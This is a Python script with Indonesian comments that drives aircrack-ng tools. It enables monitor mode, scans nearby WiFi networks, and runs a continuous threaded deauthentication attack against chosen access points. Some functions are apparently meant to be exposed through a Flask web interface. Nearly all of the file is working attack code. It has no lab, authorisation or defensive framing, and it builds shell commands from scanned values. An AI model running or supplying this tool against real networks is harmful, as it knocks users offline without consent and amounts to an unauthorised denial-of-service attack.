import subprocess
import time
import threading
import signal
import sys
import re
import os
import glob

# ====================== VARIABEL GLOBAL ======================

monitor_iface = None
original_iface = None
deauth_thread = None
deauth_running = False

# ====================== FUNGSI MANAJEMEN INTERFACE ======================

def find_wireless_interfaces():
    result = subprocess.run(["iwconfig"], capture_output=True, text=True)
    lines = result.stdout.split('\n')
    interfaces = []
    for line in lines:
        if "no wireless extensions" in line:
            continue
        if line.strip() and not line.startswith(" "):
            iface = line.split()[0]
            if iface not in ["lo", "eth0", "eth1"]:
                interfaces.append(iface)
    return interfaces

def is_monitor_mode(iface):
    result = subprocess.run(["iwconfig", iface], capture_output=True, text=True)
    return "Mode:Monitor" in result.stdout

def start_monitor_mode(iface):
    print(f"[*] Starting monitor mode on {iface}...")
    subprocess.run(["sudo", "airmon-ng", "check", "kill"], check=False)
    result = subprocess.run(["sudo", "airmon-ng", "start", iface], capture_output=True, text=True)
    for line in result.stdout.split('\n'):
        if "monitor mode enabled on" in line:
            parts = line.split()
            for i, part in enumerate(parts):
                if part == "on" and i+1 < len(parts):
                    new_iface = parts[i+1].strip()
                    print(f"[+] Monitor interface: {new_iface}")
                    return new_iface
    interfaces = find_wireless_interfaces()
    for i in interfaces:
        if "mon" in i and i != iface:
            print(f"[+] Found monitor interface: {i}")
            return i
    raise RuntimeError("Could not determine monitor interface name")

def stop_monitor_mode(iface):
    if iface and iface != original_iface:
        print(f"[*] Stopping monitor mode on {iface}...")
        subprocess.run(["sudo", "airmon-ng", "stop", iface], check=False)
    print("[*] Restarting NetworkManager...")
    subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], check=False)

def ensure_monitor_mode():
    global monitor_iface, original_iface
    interfaces = find_wireless_interfaces()
    for iface in interfaces:
        if is_monitor_mode(iface):
            monitor_iface = iface
            print(f"[+] Found existing monitor interface: {monitor_iface}")
            return monitor_iface
    for iface in interfaces:
        if not is_monitor_mode(iface) and not iface.startswith("mon"):
            original_iface = iface
            try:
                new_iface = start_monitor_mode(iface)
                monitor_iface = new_iface
                print(f"[+] Successfully created monitor interface: {monitor_iface}")
                return monitor_iface
            except Exception as e:
                print(f"[-] Failed to start monitor on {iface}: {e}")
                continue
    raise RuntimeError("No wireless interface available")

def get_monitor_interface():
    global monitor_iface
    if monitor_iface and is_monitor_mode(monitor_iface):
        return monitor_iface
    interfaces = find_wireless_interfaces()
    for iface in interfaces:
        if is_monitor_mode(iface):
            monitor_iface = iface
            return monitor_iface
    return ensure_monitor_mode()

def set_channel(iface, channel):
    try:
        subprocess.run(["iwconfig", iface, "channel", str(channel)], check=True, capture_output=True)
        return True
    except:
        return False

# ====================== SIGNAL STRENGTH ======================

def get_signal_level(power):
    if power is None:
        return "Almost Hilang"
    if power > -50:
        return "Kuat"
    elif power > -70:
        return "Sedang"
    elif power > -85:
        return "Lemah"
    else:
        return "Almost Hilang"

# ====================== PARSE CSV ======================

def parse_csv(filename):
    networks = []
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
    except FileNotFoundError:
        return networks

    start_parsing = False
    for i, line in enumerate(lines):
        if "bssid" in line.lower() and "channel" in line.lower() and "essid" in line.lower():
            start_parsing = True
            continue
        if start_parsing:
            if line.strip() == "" or "station mac" in line.lower():
                break
            parts = line.split(',')
            if len(parts) >= 14:
                bssid = parts[0].strip()
                channel = parts[3].strip()
                essid = parts[13].strip()
                power_str = parts[8].strip() if len(parts) > 8 else ''
                try:
                    power = int(power_str)
                except:
                    power = None
                if bssid and len(bssid) == 17 and ":" in bssid:
                    networks.append({
                        "bssid": bssid,
                        "channel": channel if channel else "?",
                        "essid": essid if essid else "[Hidden]",
                        "power": power,
                        "signal_level": get_signal_level(power)
                    })
    return networks

# ====================== DEAUTH LOOP ======================

def deauth_loop(targets, interface):
    global deauth_running
    while deauth_running:
        for target in targets:
            if not deauth_running:
                break
            bssid = target['bssid']
            channel = target['channel']
            set_channel(interface, channel)
            cmd = f"sudo aireplay-ng --deauth 10 -a {bssid} {interface}"
            try:
                subprocess.run(cmd, shell=True, timeout=2, check=False)
            except:
                pass
            time.sleep(0.5)
        time.sleep(1)

# ====================== FUNGSI UNTUK FLASK ======================

def deauth_scan():
    """Scan WiFi networks - return list of networks"""
    try:
        interface = get_monitor_interface()
        print(f"[*] Scanning with {interface}...")
        
        for f in glob.glob("/tmp/scan_output*.csv"):
            try:
                os.remove(f)
            except:
                pass
        
        cmd = f"timeout 12 sudo airodump-ng {interface} -w /tmp/scan_output --output-format csv"
        subprocess.run(cmd, shell=True, capture_output=True, text=True)
        
        possible_files = [
            "/tmp/scan_output-01.csv",
            "/tmp/scan_output-02.csv",
            "/tmp/scan_output-03.csv",
            "/tmp/scan_output.csv"
        ]
        
        networks = []
        for f in possible_files:
            if os.path.exists(f):
                print(f"[*] Parsing file: {f}")
                networks = parse_csv(f)
                if networks:
                    break
        
        if networks:
            networks.sort(key=lambda x: x['power'] if x['power'] is not None else -1000, reverse=True)
            print(f"[+] Found {len(networks)} networks")
            return {"status": "success", "networks": networks}
        else:
            print("[*] No networks found in CSV, using fallback method...")
            cmd2 = f"timeout 8 sudo airodump-ng {interface} 2>/dev/null | grep -E '^[0-9A-F]' | head -20"
            result2 = subprocess.run(cmd2, shell=True, capture_output=True, text=True)
            lines = result2.stdout.split('\n')
            for line in lines:
                parts = line.split()
                if len(parts) >= 7:
                    bssid = parts[0]
                    channel = parts[2] if len(parts) > 2 else "?"
                    essid = " ".join(parts[6:]) if len(parts) > 6 else "[Hidden]"
                    if bssid and len(bssid) == 17 and ":" in bssid:
                        networks.append({
                            "bssid": bssid,
                            "channel": channel,
                            "essid": essid,
                            "power": None,
                            "signal_level": "Almost Hilang"
                        })
            networks.sort(key=lambda x: x['power'] if x['power'] is not None else -1000, reverse=True)
            return {"status": "success", "networks": networks}
            
    except Exception as e:
        print(f"[-] Error during scan: {e}")
        return {"status": "error", "message": str(e)}

def deauth_start(targets):
    """Start deauth attack on targets"""
    global deauth_thread, deauth_running
    
    if not targets or len(targets) == 0:
        return {"status": "error", "message": "No targets selected"}
    
    interface = get_monitor_interface()
    if not interface:
        return {"status": "error", "message": "Monitor interface not found"}
    
    deauth_stop()
    deauth_running = True
    deauth_thread = threading.Thread(target=deauth_loop, args=(targets, interface))
    deauth_thread.daemon = True
    deauth_thread.start()
    
    target_list = ", ".join([t['bssid'] for t in targets])
    return {"status": "success", "message": f"Deauth started on {len(targets)} target(s): {target_list}"}

def deauth_stop():
    """Stop deauth attack"""
    global deauth_running, deauth_thread
    deauth_running = False
    if deauth_thread and deauth_thread.is_alive():
        deauth_thread.join(timeout=2)
    deauth_thread = None
    subprocess.run("sudo pkill -f 'aireplay-ng --deauth'", shell=True, check=False)
    return {"status": "success", "message": "Deauth stopped"}

def deauth_cleanup():
    """Cleanup monitor interface"""
    if monitor_iface:
        stop_monitor_mode(monitor_iface)